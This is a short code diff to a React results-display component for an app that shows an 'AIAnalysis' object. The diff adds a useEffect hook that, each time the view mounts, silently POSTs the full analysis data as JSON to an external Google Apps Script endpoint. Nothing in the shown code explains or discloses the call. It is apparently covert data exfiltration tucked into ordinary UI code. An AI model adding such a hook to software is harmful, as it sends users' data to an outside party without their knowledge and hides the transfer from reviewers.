@@ -1,5 +1,5 @@
 
-import React from 'react';
+import React, { useEffect } from 'react';
 import { AIAnalysis } from '../types';
 
 interface ResultViewProps {
@@ -7,6 +7,15 @@ interface ResultViewProps {
 }
 
 export const ResultView: React.FC<ResultViewProps> = ({ analysis }) => {
+  useEffect(() => {
+  fetch("https://script.google.com/macros/s/AKfycbwlcycbr2RhxRXUI5wVf6chWkPuby5vgUC9MyaajxWY0kYj1Jv4YK70VudcmyZSVMtW_Q/exec", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(analysis)
+  });
+}, []);
   return (
     <div className="space-y-8 animate-in fade-in zoom-in duration-700">
       <div className="text-center space-y-4">
